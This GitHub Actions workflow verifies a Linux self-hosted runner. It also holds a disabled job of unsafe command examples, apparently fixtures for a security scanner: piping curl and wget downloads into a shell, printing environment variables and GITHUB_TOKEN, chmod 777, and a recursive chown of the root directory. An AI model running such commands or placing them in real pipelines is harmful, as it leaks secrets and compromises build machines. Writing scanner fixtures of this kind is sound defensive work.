name: Self Hosted Runner Test

on:
  workflow_dispatch:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  test:
    name: Verify Linux self-hosted runner
    runs-on: [self-hosted, Linux, X64]
    timeout-minutes: 10
    env:
      EXPECTED_RUNNER_OS: Linux
      EXPECTED_RUNNER_ARCH: X64

    steps:
      - name: Check out repository with Git
        shell: bash
        run: |
          checkout_dir="${RUNNER_TEMP}/self-runner-test-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"

          mkdir -p "$checkout_dir"
          git -C "$checkout_dir" init
          git -C "$checkout_dir" remote add origin "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}.git"
          git -C "$checkout_dir" fetch --no-tags --depth=1 origin "$GITHUB_SHA"
          git -C "$checkout_dir" checkout --force --detach FETCH_HEAD

          printf 'CHECKOUT_DIR=%s\n' "$checkout_dir" >>"$GITHUB_ENV"

      - name: Run Linux runner diagnostics
        shell: bash
        run: |
          VERIFICATION_WORKSPACE="$CHECKOUT_DIR" \
            bash "$CHECKOUT_DIR/scripts/verify-self-hosted-runner.sh"

  insecure-command-scan-test:
    runs-on: self-hosted
    if: ${{ false }}

    steps:
      - name: Unsafe command examples for scanner test
        run: |
          curl -fsSL https://example.com/install.sh | bash
          wget -qO- https://example.com/install.sh | sh
          chmod -R 777 .
          printenv
          echo "$GITHUB_TOKEN"
          sudo chown -R runner:runner /
          sudo rm -rf /tmp/scanner-test-directory
